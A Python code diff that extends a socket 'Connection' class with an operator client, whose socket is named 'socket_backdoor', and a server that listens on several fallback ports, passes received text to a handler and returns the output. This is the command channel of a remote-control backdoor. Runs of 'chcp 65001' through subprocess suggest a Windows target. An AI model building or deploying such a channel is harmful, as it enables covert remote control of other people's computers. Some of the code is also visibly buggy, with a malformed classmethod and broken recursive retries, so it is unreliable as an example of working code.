@@ -1,5 +1,6 @@
 from threading import *
 from socket import *
+import subprocess
 
 ############################# CONNECTION CLASS ##############################
 
@@ -101,7 +102,7 @@ class Connection():
 
 
     @classmethod
-    def Server(cls, func):     
+    def Server(cls, funct):     
         """
         Port -> One   : 15000
                 Two   : 15897
@@ -110,24 +111,89 @@ class Connection():
         """
         def wrap():
             try:
-                cls.Server_TCP(15000, func)
+                cls.Stable_Server(15000, func=funct)
                 return True
             except:    
                 try:
-                    cls.Server_TCP(15897, func)
+                    cls.Stable_Server(15897, func=funct)
                 except:
                     try:
-                        cls.Server_TCP(43201, func)
+                        cls.Stable_Server(43201, func=funct)
                     except:
                         try:
-                            cls.Server_TCP(32798, func)
+                            cls.Stable_Server(32798, func=funct)
                         except:
                             return False
         return wrap
 
+    @classmethod
+    def Server_RESPONSE_NULL(data):
+        return data
 
     @classmethod
-    def Server_TCP(cls, port, func, address='', _backlog=3, buffer=4096):
+    def Stable_Client(cls, host, port, buffer=4096):
+        try:
+            NO_RES = subprocess.run("chcp 65001", shell=True, stdout=subprocess.PIPE)
+        except:
+             pass
+
+        _HOST = host
+        _PORT = port
+
+        socket_backdoor = socket()
+        socket_backdoor.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        socket_backdoor.connect((_HOST, _PORT))
+
+        while True:
+            command = input('>>>')
+            socket_backdoor.send(command.encode())
+
+            data = socket_backdoor.recv(buffer).decode()
+            print(data)
+
+        socket_backdoor.close()
+        return None
+
+    @classmethod
+    def Stable_Server(cls, port, func=None, address='', _backlog=3, buffer=4096, listener=1):
+
+        if _backlog == 0 or _backlog > 200:
+            return False
+
+        try:
+            socket_server = socket()
+            socket_server.bind((address,port))
+            socket_server.listen(listener)
+
+        except error as sk_error:
+            cls.Stable_Server(port, _backlog=(_backlog-1))
+
+        connection, (client_IP, client_PORT) = socket_server.accept()
+
+        while True:
+            try:
+
+                _recieveData = connection.recv(buffer).decode()
+
+                if func:
+                    response = func(str(_recieveData))
+                else:
+                    response = cls.Server_RESPONSE_NULL(str(_recieveData))
+
+                response = str(response)
+                response = response.encode()
+
+                connection.send(response)
+
+            except:
+                connection.send('Flag Error :: Server-Failed-Queue'.encode())
+            
+        connection.close()
+        socket_server.close()
+            
+
+    @classmethod
+    def Server_TCP(cls, port, func, address='', _backlog=3, buffer=4096, listener=1):
         
         if _backlog == 0 or _backlog > 500:
             return False
@@ -137,10 +203,10 @@ class Connection():
             try:
                 s = socket()
                 s.bind((address,port))
-                s.listen(_backlog)
+                s.listen(listener)
                 
-            except socket.error as sk_error:
-                cls.Server_TCP(address, (_backlog-1))
+            except error as sk_error:
+                cls.Server_TCP(port, func, _backlog=(_backlog-1))
 
             connection, client_address = s.accept()
 
@@ -155,7 +221,7 @@ class Connection():
                     connection.send(res)
                     connection.close()
                 except:
-                    connection.send('Flag Error : Server-Failed-Queue'.encode())
+                    connection.send('Flag Error :: Server-Failed-Queue'.encode())
                     connection.close()
                     
             except:
